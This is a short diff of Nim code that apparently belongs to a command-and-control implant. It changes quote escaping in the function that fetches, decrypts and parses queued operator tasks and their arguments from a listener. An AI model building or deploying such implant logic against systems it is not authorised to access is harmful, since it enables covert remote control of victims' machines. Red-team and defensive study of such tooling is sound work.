@@ -137,14 +137,14 @@ proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
     else:
         try:
             # Attempt to parse task (parseJson() needs string literal... sigh)
-            var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey).replace("\'", "\"")
+            var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey).replace("\'", "\\\"")
             var parsedResponseData = parseJson(responseData)
 
             # Get the task and task GUID from the response
             var task = parsedResponseData["task"].getStr()
             cmdGuid = parsedResponseData["guid"].getStr()
 
-            try: 
+            try:
                 # Arguments are included with the task
                 cmd = task.split(' ', 1)[0].toLower()
                 args = parseCmdLine(task.split(' ', 1)[1])
